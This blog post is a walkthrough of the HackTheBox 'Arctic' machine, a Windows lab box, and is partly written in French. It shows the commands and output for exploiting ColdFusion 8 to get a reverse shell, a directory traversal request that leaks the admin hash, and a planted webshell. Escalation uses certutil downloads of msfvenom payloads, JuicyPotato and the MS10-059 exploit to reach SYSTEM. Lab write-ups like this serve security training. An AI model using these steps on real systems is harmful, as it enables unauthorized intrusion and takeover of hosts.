---
image: "/assets/img/posts/ar_5ddefd61d8.jpg"
title: "Arctic Hackthebox"
description: "Detailed offensive security CTF walkthrough and exploit analysis for Arctic-HacktheBox."
pubDate: "2024-02-29"
author: "MrR0807"
categories: ["CTF"]
tags: ["cybersecurity", "writeup"]
pin: false
---
Good evening again, I am going to present to you my writeup on operating an Easy Level Windows Machine on HacktheBox





Description:





Arctic is pretty simple, but web server load times cause some operational issues. Basic troubleshooting is required for the exploit to work properly.





[The Best Academy to Learn Hacking](https://referral.hackthebox.com/mz6xj5g).Beginner Friendly challenges on TryHackMe [Here](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1).


## Reconaissance





To get started, I'm going to run an nmap scan with my tool [nmapauto](https://github.com/nenandjabhata/CTFs-Journey/blob/main/Scripts/nmapauto.sh).





  `








```bash


─# /home/blo/tools/nmapautomate/nmapauto.sh $ip





###############################################


###---------) Starting Quick Scan (---------###


###############################################





Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 18:24 CST


Initiating Ping Scan at 18:24


Scanning 10.129.136.143 [4 ports]


Completed Ping Scan at 18:24, 2.18s elapsed (1 total hosts)


Initiating Parallel DNS resolution of 1 host. at 18:24


Completed Parallel DNS resolution of 1 host. at 18:24, 0.00s elapsed


Initiating SYN Stealth Scan at 18:24


Scanning 10.129.136.143 [1000 ports]


SYN Stealth Scan Timing: About 99.99% done; ETC: 18:28 (0:00:00 remaining)


Completed SYN Stealth Scan at 18:28, 231.60s elapsed (1000 total ports)


Nmap scan report for 10.129.136.143


Host is up (2.0s latency).


Not shown: 997 filtered tcp ports (no-response)


PORT      STATE SERVICE


135/tcp   open  msrpc


8500/tcp  open  fmtp


49154/tcp open  unknown





----------------------------------------------------------------------------------------------------------


Open Ports : 135,8500,49154                                                                                                                                                                  


--------------------------------


Service scan Timing: About 66.67% done; ETC: 18:33 (0:00:47 remaining)


Nmap scan report for 10.129.136.143


Host is up (0.58s latency).





PORT      STATE SERVICE VERSION


135/tcp   open  msrpc   Microsoft Windows RPC


8500/tcp  open  fmtp?


49154/tcp open  msrpc   Microsoft Windows RPC


Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows





```


`





With my scan, I only find 3 ports which are open on the Machine including:





Ports 135 & 49154: qui execute le Microsoft Windows RPCPort 8500: qui elle execute le Flight Message Transfert Protocol(FMTP)





When visiting port 8500, land on this page





[![Page D](/assets/img/posts/image-86_2c2d2e4248.png)](https://i.ibb.co/Fn05ncT/image-86.png)





In these two (2) directories, while searching I come across a /administrator page which sends me to a login





[![Admin](/assets/img/posts/ad_9899105a6f.png)](https://i.ibb.co/5T2jpnd/ad.png)





In this I find in the title Adobe ColdFusion 8 Administrator. so I search for exploits on Google and Searchsploit





[![Searchsploit](/assets/img/posts/cold_f208637b34.png)](https://i.ibb.co/X7zytVy/cold.png)





With this search I find the 50057.py exploit and I copy it locally. Reading the exploit I see that it is CVE-2009-2265.





I open the exploit in my Sublime text to read it a little and modify it at the IPs level, then I run `








```bash


─# python3 coldfusion.py         





Generating a payload...


Payload size: 1496 bytes


Saved as: c39559fbd32947c597bc9bbc08db4a9f.jsp





Priting request...


Content-type: multipart/form-data; boundary=854f29a3ce9247d89abbcf5729ffc490


Content-length: 1697





--854f29a3ce9247d89abbcf5729ffc490


Content-Disposition: form-data; name="newfile"; filename="c39559fbd32947c597bc9bbc08db4a9f.txt"


Content-Type: text/plain





Printing some information for debugging...


lhost: 10.10.16.4


lport: 1337


rhost: 10.129.136.143


rport: 8500


payload: c39559fbd32947c597bc9bbc08db4a9f.jsp





Deleting the payload...





Listening for connection...





Executing the payload...


listening on [any] 1337 ...


connect to [10.10.16.4] from (UNKNOWN) [10.129.136.143] 49295


Microsoft Windows [Version 6.1.7600]


Copyright (c) 2009 Microsoft Corporation.  All rights reserved.


C:\ColdFusion8\runtime\bin>whoami


whoami


arctic\tolis





```


`





Now, we have a non-privileged shell as a tolis in the system. So we'll need to find a way to escalate privileges.





## Exploitation Manuelle(Directory Traversal )





By doing some research for manual exploitation and broadening my understanding, I found that this software is also vulnerable to a Directory Traversal Vulnerability





[![Directory Traversal](/assets/img/posts/Screenshot-2024-02-29-at-_ccf8aa91f1.png)](https://i.ibb.co/NNBMZ6t/Screenshot-2024-02-29-at-19-04-46-Adobe-Cold-Fusion-Directory-Traversal.png)





Here I can see that we are told to send a GET request in the following PATH: /CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en





By running this request on Burpsuite, we get a return of an administrator password encrypted in sha1





[![hash](/assets/img/posts/burp1_882bdc6cc3.png)](https://i.ibb.co/z8kC1Zy/burp1.png)





So by using crackstation I manage to crack it





[![Cracked](/assets/img/posts/Screenshot-2024-02-29-at-_0ec3bbe657.png)](https://i.ibb.co/NWB1H3h/Screenshot-2024-02-29-at-19-11-03-Crack-Station-Online-Password-Hash-Cracking-MD5-SHA1-Linux-Rainbow.png)





### Shell





Now, that I am in the admin panel, I will then try to have a shell on the machine which hosts this site by injecting a malicious CFM file which will help us to execute commands remotely. For this we must:





First to find our payload in cfm, I did some research on Github and I came across this [Payload](https://github.com/reider-roque/pentest-tools/blob/master/shells/webshell.cfm) Next, I copied it locally. Go to the Settings tab on the left and click on the “Mappings” section. One of the default mappings is C:\ColdFusion8\wwwroot\CFIDE. This is where I am going to write my shell so I copy this path Then I click on Debugging and Logging to create a Scheduled Tasks by clicking on Schedule New Tasks Put the name I want, Next, in the url I put my IP of my http.server which will host my payload in cfm followed by the payload name `








```bash


 webshell.cfm


                                                                                                                                                                                             


┌──(root㉿xXxX)-[/home/…/CTFs/Boot2root/HTB/exploits]


└─# python3 -m http.server 80


Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...





```


`Click on the Save output to a file option. Now I paste the path you obtained from Mappings into the “File” field followed by the name of my shell for example C:\ColdFusion8\wwwroot\CFIDE/hacked.cfm





Here is a picture of the necessary explanations that I have just given.





[![Shell file](/assets/img/posts/b2_ceba1d36ec.png)](https://i.ibb.co/4Mv2hRg/b2.png)





By clicking on Submit the site redirects me to http://10.129.201.72:8500/CFIDE/administrator/index.cfm followed by Sheduled Tasks.





From here I click on Run Sheduled Tasks In the Actions icons





[![Shedule](/assets/img/posts/Screenshot-2024-02-29-at-_20c7e2d657.png)](https://i.ibb.co/ZJq7mSR/Screenshot-2024-02-29-at-19-47-16-Scheduled-Tasks.png)





I go back to my Terminal and I find that:





  `








```bash


└─# python3 -m http.server 80


Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


10.129.201.72 - - [29/Feb/2024 19:46:23] "GET /webshell.cfm HTTP/1.1" 200 -


10.129.201.72 - - [29/Feb/2024 19:47:07] "GET /webshell.cfm HTTP/1.1" 200 -





```


`





My shell was successfully downloaded to the Box. Now, we need to find our file and execute it.





Knowing that I put my file under the name hacked.cfm in the /CFIDE of C:\ColdFusion8\wwwroot\CFIDE/hacked.cfmSo by visiting http://10.129.201.72:8500/CFIDE/ I found my file written and executing it with whoami





[![File](/assets/img/posts/Screenshot-2024-02-29-at-_0cdd9415df.png)](https://i.ibb.co/1TKjb8x/Screenshot-2024-02-29-at-19-58-10-Error-Occurred-While-Processing-Request.png)





With curl I will see what is written in this file





  `








```bash


└─# curl -s "http://10.129.201.72:8500/CFIDE/hack.txt"  


arctic\tolis





```


`To have a shell in my machine, I will create an .exe payload with msfvenom then send it to the site using an http.server and write it in C:\ColdFusion8\wwwroot\CFIDE/ and execute it with curl`








```bash


┌──(root㉿xXxX)-[/home/…/CTFs/Boot2root/HTB/exploits]


└─# msfvenom -p windows/shell_reverse_tcp lhost=10.10.16.5 lport=1337 -f exe > reverse.exe


[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload


[-] No arch selected, selecting arch: x86 from the payload


No encoder specified, outputting raw payload


Payload size: 324 bytes


Final size of exe file: 73802 bytes





┌──(root㉿xXxX)-[/home/…/CTFs/Boot2root/HTB/exploits]


└─# python3 -m http.server 80


Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...





```


`





In the Here is my command option: /c "certutil.exe -urlcache -f http://10.10.16.5/reverse.exe C:\ColdFusion8\wwwroot\CFIDE/hacked.exe" and TimeOut a 5 Finally, by executing the payload with /c C:\ColdFusion8\wwwroot\CFIDE/hacked.exe I am getting





[![Hacked](https://i.ibb.co/NKfzK8f/b4.png)](https://i.ibb.co/NKfzK8f/b4.png)





## Privilege Escalation





Now, that I have had initial access to the Machine, so Now, I will begin my research for Privilege Escalation





### 1er Methodes(SeImpersonatePrivilege)





Starting with systeminfo to get an idea of ​​the OS version running on the victim, as well as the architecture and patches installed with this command:





  `








```bash


systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"


Host Name:                 ARCTIC


OS Name:                   Microsoft Windows Server 2008 R2 Standard 


OS Version:                6.1.7600 N/A Build 7600


System Type:               x64-based PC


Hotfix(s):                 N/A





C:\ColdFusion8\runtime\bin>





```


`Dapres ce resultat, on observe quil sagit dune version ancienne de Windows Server et quaucun correctif na ete installé.


> When you find an old operating system and no patches installed, you should immediately think about one. exploitation of the Kernel.





After having gathered information about the target host, I checked the privileges of the current user tolis, as follows:





  `








```bash


C:\ColdFusion8\runtime\bin>whoami /priv


whoami /priv





PRIVILEGES INFORMATION


----------------------





Privilege Name                Description                               State   


============================= ========================================= ========


SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 


SeImpersonatePrivilege        Impersonate a client after authentication Enabled 


SeCreateGlobalPrivilege       Create global objects                     Enabled 


SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled





C:\ColdFusion8\runtime\bin>





```


`





From here I can see that the user tolis has SeImpersonatePrivilege privileges which means that I can do a Potato attack to be Admin of this SYSTEM





> If the user has SeImpersonate, SeAssignPrimaryToken privileges, then you are SYSTEM.





https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato





First I create a payload





  `








```bash


└─# msfvenom -p windows/shell_reverse_tcp lhost=10.10.16.5 lport=1338 -f exe > shell.exe


[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload


[-] No arch selected, selecting arch: x86 from the payload


No encoder specified, outputting raw payload


Payload size: 324 bytes


Final size of exe file: 73802 bytes





```


`Then I download my payload and my JuicyPotato.exe into the machine and into the same directory`








```bash


C:\Users\tolis\AppData\Local\Temp>certutil -urlcache -split -f http://10.10.16.5/JuicyPotato.exe JuicyPotato.exe


certutil -urlcache -split -f http://10.10.16.5/JuicyPotato.exe JuicyPotato.exe


****  Online  ****


  000000  ...


  054e00


CertUtil: -URLCache command completed successfully.





C:\Users\tolis\AppData\Local\Temp>





C:\Users\tolis\AppData\Local\Temp>certutil -urlcache -split -f http://10.10.16.5/shell.exe shell.exe


certutil -urlcache -split -f http://10.10.16.5/shell.exe shell.exe


****  Online  ****


  000000  ...


  01204a


CertUtil: -URLCache command completed successfully.





```


`





And with all these files together I open my netcat and I execute JuicyPotato with my payload shell.exe





  `








```bash


C:\Users\tolis\AppData\Local\Temp>.\JuicyPotato.exe -t * -p .\shell.exe -l 443


.\JuicyPotato.exe -t * -p .\shell.exe -l 443


Testing {4991d34b-80a1-4291-83b6-3328366b9097} 443


....


[+] authresult 0


{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM





[+] CreateProcessWithTokenW OK





C:\Users\tolis\AppData\Local\Temp>





```


`In my netcat Listner, I receive the connection as nt authority\system





[![nc](/assets/img/posts/b5_db31615a02.png)](https://i.ibb.co/kDcDGxq/b5.png)





### 2eme Methode(Kernel Exploit (MS10-059)





At the beginning we started by checking the systeminfo and then we were able to find that it is an old version of Windows Server and that no patch has been installed.





Les infos  `








```bash


OS Name:                   Microsoft Windows Server 2008 R2 Standard 


OS Version:                6.1.7600 N/A Build 7600





```


`





So while looking for some exploit I was able to come across this github





https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059





Its use is written in the github to create a user





  `








```bash


c:\> Churraskito.exe "C:\windows\system32\cmd.exe" "net user 123 123 /add"





```


`





So I will download it into the target Box then execute it as explained





  `








```bash


:\Users\tolis\AppData\Local\Temp>certutil -urlcache -split -f http://10.10.16.5/MS10-059.exe MS10-059.exe


certutil -urlcache -split -f http://10.10.16.5/MS10-059.exe MS10-059.exe


****  Online  ****


  000000  ...


  0bf800


CertUtil: -URLCache command completed successfully.





C:\Users\tolis\AppData\Local\Temp>.\MS10-059.exe


.\MS10-059.exe


/Chimichurri/-->This exploit gives you a Local System shell /Chimichurri/-->Usage: Chimichurri.exe ipaddress port 





```


`





Here I am told that this exploit gives me a Shell if I enter a specific IP and a port





  `








```bash


C:\Users\tolis\AppData\Local\Temp>.\MS10-059.exe 10.10.16.5 1338


.\MS10-059.exe 10.10.16.5 1338


/Chimichurri/-->This exploit gives you a Local System shell /Chimichurri/-->Changing registry values.../Chimichurri/-->Got SYSTEM token.../Chimichurri/-->Running reverse shell.../Chimichurri/-->Restoring default registry values...


C:\Users\tolis\AppData\Local\Temp>





└─# sudo rlwrap nc -lnvp 1338


listening on [any] 1338 ...


connect to [10.10.16.5] from (UNKNOWN) [10.129.201.72] 49798


Microsoft Windows [Version 6.1.7600]


Copyright (c) 2009 Microsoft Corporation.  All rights reserved.





C:\Users\tolis\AppData\Local\Temp>





```


`





And now, we are also an administrator on the Box





[![Box finished](/assets/img/posts/b6_85fb270d13.png)](https://i.ibb.co/4N1mbkD/b6.png)





### Join Us





Lets learn, explore, and hack together. Join us on Discord [here](https://discord.gg/wBT9wr9ruG).





 Share        [](https://twitter.com/intent/tweet?text=Arctic%20-%20HacktheBox(Easy)%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2FArctic-HacktheBox%2F)       [](https://www.facebook.com/sharer/sharer.php?title=Arctic%20-%20HacktheBox(Easy)%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&u=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2FArctic-HacktheBox%2F)       [](https://t.me/share/url?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2FArctic-HacktheBox%2F&text=Arctic%20-%20HacktheBox(Easy)%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE)       [](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2FArctic-HacktheBox%2F)


